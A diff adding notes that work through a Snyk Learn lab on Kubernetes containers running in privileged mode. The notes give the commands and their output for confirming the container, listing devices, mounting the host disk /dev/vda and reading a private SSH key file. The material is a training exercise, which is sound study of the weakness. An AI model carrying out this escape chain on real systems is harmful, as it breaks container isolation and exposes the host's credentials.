@@ -1,0 +1,48 @@
+https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/
+
+Step 1:
+cat /proc/1/cgroup
+
+11:memory:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+10:perf_event:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+9:freezer:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+8:net_cls,net_prio:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+7:hugetlb:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+6:pids:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+5:blkio:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+4:cpu,cpuacct:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+3:cpuset:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+2:devices:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+1:name=systemd:/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+0::/docker/59d0cacf3e29411db6f787f8a3e5946c34977e9f59e7d71ef54b76e13a9bb8d4
+
+$ ls /dev
+
+autofs           loop1   ptp0      tty12  tty24  tty36  tty48  tty6     vcs1   vcsu
+btrfs-control    loop2   pts       tty13  tty25  tty37  tty49  tty60    vcs2   vcsu1
+core             loop3   random    tty14  tty26  tty38  tty5   tty61    vcs3   vcsu2
+cpu              loop4   shm       tty15  tty27  tty39  tty50  tty62    vcs4   vcsu3
+cpu_dma_latency  loop5   snapshot  tty16  tty28  tty4   tty51  tty63    vcs5   vcsu4
+cuse             loop6   stderr    tty17  tty29  tty40  tty52  tty7     vcs6   vcsu5
+fd               loop7   stdin     tty18  tty3   tty41  tty53  tty8     vcsa   vcsu6
+full             mem     stdout    tty19  tty30  tty42  tty54  tty9     vcsa1  vda
+fuse             mqueue  tty       tty2   tty31  tty43  tty55  ttyS0    vcsa2  vsock
+input            net     tty0      tty20  tty32  tty44  tty56  uhid     vcsa3  zero
+kmsg             null    tty1      tty21  tty33  tty45  tty57  uinput   vcsa4
+loop-control     nvram   tty10     tty22  tty34  tty46  tty58  urandom  vcsa5
+loop0            ptmx    tty11     tty23  tty35  tty47  tty59  vcs      vcsa6
+
+$ sudo fdisk -l
+
+Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
+2048 cylinders, 64 heads, 32 sectors/track
+Units: sectors of 1 * 512 = 512 bytes
+
+Disk /dev/vda doesn't contain a valid partition table
+
+
+$ mkdir mountpoint
+$ sudo mount /dev/vda mountpoint
+$ cat mountpoint/home/jailer/.ssh/jail.key.priv
+
+
